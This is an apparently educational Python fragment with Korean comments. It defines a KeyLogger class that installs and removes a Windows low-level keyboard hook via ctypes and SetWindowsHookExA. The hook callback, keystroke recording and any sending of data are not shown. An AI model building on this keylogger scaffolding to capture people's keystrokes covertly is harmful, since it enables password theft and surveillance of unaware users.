import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD
# user32.dll 에서 제공하는 SetWindowsHookExA() 함수를 사용하여 훅을 설정할 예정

user32 = windll.user32 #windll 사용하겠다
kernel32 = windll.kernel32 

WINH_KEYBOARD_LL = 13 # 변수
WINM_KEYDOWN = 0x0100
CTRL_CODE = 162

class KeyLogger: #class
    def __init__(self):
        self.lUser32 = user32
        self.hooked = None
    def installHookProc(self,pointer):
        self.hooked = self.lUser32.SetWindowsHookExA(
            WINH_KEYBOARD_LL,
            pointer,
            kernel32.GetModuleHandleW(None),
            0
        )
        if not self.hooked:
            return False
        return True
    
    def uninstallHookProc(self): #함수 해제 함수 정의
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None

def getFPTR(fn):
    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
    return CMPFUNC(fn)
